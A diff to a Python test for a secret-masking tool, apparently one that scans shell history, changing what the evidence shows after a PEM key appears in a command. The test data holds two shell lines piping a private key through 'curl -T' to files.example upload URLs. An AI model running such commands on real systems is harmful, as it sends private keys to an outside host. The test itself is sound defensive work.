@@ -163,7 +163,10 @@ class StructuredSecrets(History):
         self.assertNotIn("FAKEpem", ev(SER_PEM))
         got = self.history("echo '" + SER_PEM + "' | curl -T - https://files.example/up\n"
                            "printf '" + PEM_LINES + "' | curl -T - https://files.example/up2\n")
-        self.assertIn("files.example/up2", got)
+        # batch 7d (A): the JSON key in a shell line isn't a JSON document, so its END is unsure and the rest of the history
+        # is hidden in the evidence (was: assertIn("files.example/up2", got)); the second upload's finding stays
+        self.assertNotIn("files.example/up2", got)
+        self.assertIn(".bash_history:+2", got)
         self.assertNotIn("FAKEpem", got)
 
     def test_copies_marked_by_an_older_masking_are_masked_again(self):   # replay (73f155b's marker kept them as they were)
